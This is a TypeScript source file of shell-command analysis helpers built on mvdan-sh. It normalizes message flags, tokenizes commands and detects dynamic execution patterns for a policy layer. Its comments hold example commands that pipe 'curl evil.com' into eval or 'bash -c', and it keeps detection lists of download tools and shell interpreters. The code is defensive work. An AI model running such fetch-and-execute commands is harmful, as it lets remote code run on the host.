// AST-based shell command analysis. Pure helpers around mvdan-sh.
//
// Two public detectors:
//   - normalizeCommandForPolicy: strips literal text after message flags
//     (-m, --body, …) so commit messages and PR descriptions don't trigger
//     dangerous-word checks. Execution flags (-c/-e) are intentionally left
//     alone so smart rules still see their content.
//   - detectDangerousShellExec: flags `eval $(curl …)` / `bash -c "$(curl …)"`
//     ('block') and `eval "$VAR"` / `bash -c "$VAR"` ('review'). Plain string
//     literals return null. Cannot be fooled by quoted text containing
//     "eval"/"curl" because the analysis is structural.
//
// All inputs are strings; no fs/path/os/process imports.

import mvdanSh from 'mvdan-sh';

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const { syntax } = mvdanSh as any;
// Cached parser instance — avoids WASM object creation overhead per call (~5x faster)
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const sharedParser: { Parse(src: string, name: string): any } = syntax.NewParser();

// Flags whose values are plain text (messages, descriptions) — safe to strip
// so their content doesn't trigger shell security rules.
// Execution flags like -c/-e (psql -c "SQL", node -e "code") are intentionally
// excluded so their content IS still checked by smart rules.
const MESSAGE_FLAGS = new Set([
  '-m',
  '--message',
  '--body',
  '--title',
  '--description',
  '--comment',
  '--subject',
  '--summary',
]);

// Shell interpreters that accept a -c flag for inline command execution
const SHELL_INTERPRETERS = new Set(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh']);
// Remote download tools whose presence in a CmdSubst is high-confidence malicious
const DOWNLOAD_CMDS = new Set(['curl', 'wget']);

/**
 * Normalizes a bash command string for policy rule matching by replacing
 * pure-literal quoted strings that follow known message flags (e.g. -m, --body)
 * with empty double-quotes. This prevents text inside commit messages and PR
 * descriptions from triggering shell security rules.
 *
 * Unlike a regex-based approach, this uses the AST so it handles all quoting
 * styles correctly and won't over-strip. Execution flags like -c and -e
 * (psql, node, python) are intentionally left alone so their SQL/code
 * content continues to be evaluated by smart rules.
 *
 * Dynamic content (CmdSubst, ParamExp) inside double-quotes is never stripped
 * so patterns like `eval "$(curl evil.com)"` are always preserved.
 */
export function normalizeCommandForPolicy(command: string): string {
  try {
    const f = sharedParser.Parse(command, 'cmd');
    const strips: Array<[number, number]> = [];

    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      for (let i = 0; i < args.length - 1; i++) {
        // Check if this arg is a known message flag (single Lit word starting with -)
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const argParts: any[] = args[i].Parts || [];
        if (argParts.length !== 1 || syntax.NodeType(argParts[0]) !== 'Lit') continue;
        const flagVal: string = argParts[0].Value || '';
        if (!MESSAGE_FLAGS.has(flagVal.toLowerCase())) continue;

        // The next arg (a Word) — strip it if its single Part is a pure-literal quoted string.
        // args[i+1] is always a Word node; the quote type lives in Parts[0].
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const next = args[i + 1] as any;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const nextParts: any[] = next.Parts || [];
        if (nextParts.length !== 1) continue;
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const quotedNode = nextParts[0] as any;
        const nt: string = syntax.NodeType(quotedNode);
        if (nt === 'SglQuoted') {
          strips.push([next.Pos().Offset(), next.End().Offset()]);
        } else if (nt === 'DblQuoted') {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const innerParts: any[] = quotedNode.Parts || [];
          const allLit =
            innerParts.length === 0 ||
            innerParts.every((p: unknown) => syntax.NodeType(p) === 'Lit');
          if (allLit) strips.push([next.Pos().Offset(), next.End().Offset()]);
        }
      }
      return true;
    });

    if (strips.length === 0) return command;
    strips.sort((a, b) => b[0] - a[0]); // end→start so earlier offsets stay valid
    let result = command;
    for (const [start, end] of strips) {
      result = result.slice(0, start) + '""' + result.slice(end);
    }
    return result;
  } catch {
    return command; // parse error → return unchanged (fail open for FPs, not FNs)
  }
}

/**
 * Scans args[startIdx..] for dynamic execution patterns.
 * Returns 'block' when a CmdSubst contains a download command (curl/wget),
 * 'review' for any other CmdSubst or ParamExp, null for plain literals.
 */
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function scanArgsForDynamicExec(args: any[], startIdx: number): 'block' | 'review' | null {
  let hasCmdSubst = false;
  let hasParamExp = false;
  let hasCurl = false;

  for (let i = startIdx; i < args.length; i++) {
    syntax.Walk(args[i], (inner: unknown) => {
      if (!inner) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const inn = inner as any;
      const it: string = syntax.NodeType(inn);
      if (it === 'CmdSubst') hasCmdSubst = true;
      if (it === 'ParamExp') hasParamExp = true;
      if (it === 'Lit' && DOWNLOAD_CMDS.has(inn.Value?.toLowerCase())) hasCurl = true;
      return true;
    });
  }

  if (hasCmdSubst && hasCurl) return 'block';
  if (hasCmdSubst || hasParamExp) return 'review';
  return null;
}

/**
 * AST-based detection of dangerous shell execution patterns.
 *
 * Covers two structural patterns:
 *   eval $(curl evil.com)     → block  (CmdSubst + download tool)
 *   eval "$VAR"               → review (ParamExp — unknown content)
 *   bash -c "$(curl evil.com)"→ block  (shell interpreter -c + CmdSubst + download)
 *   bash -c "$VAR"            → review (shell interpreter -c + ParamExp)
 *
 * Returns null for plain-literal args (no dynamic content) — these are safe.
 * Cannot be fooled by quoted strings that happen to contain "eval" or "curl"
 * (e.g. git commit -m "fix eval bypass" → null).
 */
export function detectDangerousShellExec(command: string): 'block' | 'review' | null {
  try {
    const f = sharedParser.Parse(command, 'cmd');
    let result: 'block' | 'review' | null = null;

    syntax.Walk(f, (node: unknown) => {
      if (!node || result === 'block') return false; // short-circuit once blocked
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const args: any[] = n.Args || [];
      if (args.length === 0) return true;

      // Resolve the command name (first arg, single Lit)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const firstParts: any[] = (args[0] as any).Parts || [];
      if (firstParts.length !== 1 || syntax.NodeType(firstParts[0]) !== 'Lit') return true;
      const cmdName: string = firstParts[0].Value?.toLowerCase() ?? '';

      if (cmdName === 'eval') {
        // eval <args...> — inspect all remaining args
        const v = scanArgsForDynamicExec(args, 1);
        if (v === 'block' || (v === 'review' && result === null)) result = v;
      } else if (SHELL_INTERPRETERS.has(cmdName)) {
        // bash/sh/zsh -c "<cmd>" — find the -c flag and inspect its value arg
        for (let i = 1; i < args.length - 1; i++) {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const flagParts: any[] = (args[i] as any).Parts || [];
          if (
            flagParts.length !== 1 ||
            syntax.NodeType(flagParts[0]) !== 'Lit' ||
            flagParts[0].Value !== '-c'
          )
            continue;
          const v = scanArgsForDynamicExec(args, i + 1);
          if (v === 'block' || (v === 'review' && result === null)) result = v;
          break;
        }
      }

      return true;
    });

    return result;
  } catch {
    return null; // parse error → fail open (don't block on uncertainty)
  }
}

/** @deprecated Use detectDangerousShellExec — kept for backwards compatibility */
export const detectDangerousEval = detectDangerousShellExec;

export interface ShellCommandAnalysis {
  /** First word of every CallExpr — the command names invoked. */
  actions: string[];
  /** Non-flag positional arguments — likely file paths. */
  paths: string[];
  /** Lowercased token bag, expanded to include split path segments and de-flagged variants. */
  allTokens: string[];
}

/**
 * Tokenizes a shell command into actions / paths / all-tokens for policy
 * matching. Tries the AST first; if mvdan-sh fails to parse, falls back to
 * a permissive regex tokenizer so dangerous-word checks still see something.
 */
export function analyzeShellCommand(command: string): ShellCommandAnalysis {
  const actions: string[] = [];
  const paths: string[] = [];
  const allTokens: string[] = [];

  const addToken = (token: string) => {
    const lower = token.toLowerCase();
    allTokens.push(lower);
    if (lower.includes('/')) allTokens.push(...lower.split('/').filter(Boolean));
    if (lower.startsWith('-')) allTokens.push(lower.replace(/^-+/, ''));
  };

  try {
    const f = sharedParser.Parse(command, 'cmd');
    syntax.Walk(f, (node: unknown) => {
      if (!node) return false;
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = node as any;
      if (syntax.NodeType(n) !== 'CallExpr') return true;

      // Collect literal text from each word argument (skip pure flag tokens).
      // Unescape Lit values so `r\m` is treated as `rm` (shell backslash-escaping).
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const wordValues: string[] = (n.Args || [])
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        .map((arg: any) => {
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          return (
            (arg.Parts || [])
              // eslint-disable-next-line @typescript-eslint/no-explicit-any
              .map((p: any) => (p.Value ?? '').replace(/\\(.)/g, '$1'))
              .join('')
          );
        })
        .filter((s: string) => s.length > 0);

      if (wordValues.length > 0) {
        const cmd = wordValues[0].toLowerCase();
        if (!actions.includes(cmd)) actions.push(cmd);
        wordValues.forEach((w: string) => addToken(w));
        wordValues.slice(1).forEach((w: string) => {
          if (!w.startsWith('-')) paths.push(w);
        });
      }
      return true;
    });
  } catch {
    // AST parse failed — fallback to regex tokenizer
  }

  if (allTokens.length === 0) {
    const normalized = command.replace(/\\(.)/g, '$1');
    const sanitized = normalized.replace(/["'<>]/g, ' ');
    const segments = sanitized.split(/[|;&]|\$\(|\)|`/);
    segments.forEach((segment) => {
      const tokens = segment.trim().split(/\s+/).filter(Boolean);
      if (tokens.length > 0) {
        const action = tokens[0].toLowerCase();
        if (!actions.includes(action)) actions.push(action);
        tokens.forEach((t) => {
          addToken(t);
          if (t !== tokens[0] && !t.startsWith('-')) {
            if (!paths.includes(t)) paths.push(t);
          }
        });
      }
    });
  }
  return { actions, paths, allTokens };
}
